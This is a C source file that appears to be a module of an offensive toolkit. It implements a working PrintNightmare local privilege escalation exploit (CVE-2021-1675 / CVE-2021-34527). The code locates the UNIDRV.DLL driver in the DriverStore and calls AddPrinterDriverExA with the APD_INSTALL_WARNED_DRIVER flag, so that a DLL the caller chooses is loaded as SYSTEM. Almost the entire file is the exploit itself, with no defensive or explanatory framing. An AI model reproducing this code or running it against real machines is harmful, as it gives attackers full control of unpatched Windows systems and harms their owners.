/*
 * privesc.c — PrintNightmare LPE (CVE-2021-1675 / CVE-2021-34527)
 *
 * Exploits the Windows Print Spooler to load a DLL as SYSTEM
 * via AddPrinterDriverExA with APD_INSTALL_WARNED_DRIVER.
 *
 * MITRE ATT&CK : T1068 — Exploitation for Privilege Escalation
 */

#include <windows.h>
#include <winspool.h>
#include <stdio.h>
#include <string.h>

#include "privesc.h"

#define APD_INSTALL_WARNED_DRIVER 0x8000

/* ================================================================
 * Find the legitimate UNIDRV.DLL in the DriverStore.
 *
 * Path pattern:
 *   C:\Windows\System32\DriverStore\FileRepository\
 *     ntprint.inf_amd64_<hash>\Amd64\UNIDRV.DLL
 *
 * The hash varies per system, so we search with FindFirstFile.
 * ================================================================ */

static int find_driver_path(char *out, size_t size)
{
    char windir[MAX_PATH];
    GetWindowsDirectoryA(windir, MAX_PATH);

    char pattern[MAX_PATH];
    snprintf(pattern, sizeof(pattern),
             "%s\\System32\\DriverStore\\FileRepository"
             "\\ntprint.inf_amd64_*",
             windir);

    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE)
        return -1;

    snprintf(out, size,
             "%s\\System32\\DriverStore\\FileRepository"
             "\\%s\\Amd64\\UNIDRV.DLL",
             windir, fd.cFileName);
    FindClose(h);

    if (GetFileAttributesA(out) == INVALID_FILE_ATTRIBUTES)
        return -1;

    return 0;
}

/* ================================================================
 * PrintNightmare LPE exploit
 * ================================================================ */

int privesc_printnightmare(const char *dll_path)
{
    if (GetFileAttributesA(dll_path) == INVALID_FILE_ATTRIBUTES)
        return -1;

    char driver_path[MAX_PATH];
    if (find_driver_path(driver_path, sizeof(driver_path)) != 0)
        return -2;

    DRIVER_INFO_2A di  = {0};
    di.cVersion        = 3;
    di.pName           = "Microsoft XPS Document Writer v5";
    di.pEnvironment    = "Windows x64";
    di.pDriverPath     = driver_path;
    di.pDataFile       = (LPSTR)dll_path;
    di.pConfigFile     = (LPSTR)dll_path;

    if (!AddPrinterDriverExA(NULL, 2, (LPBYTE)&di,
                             APD_COPY_ALL_FILES | APD_INSTALL_WARNED_DRIVER)) {
        return -3;
    }

    return 0;
}
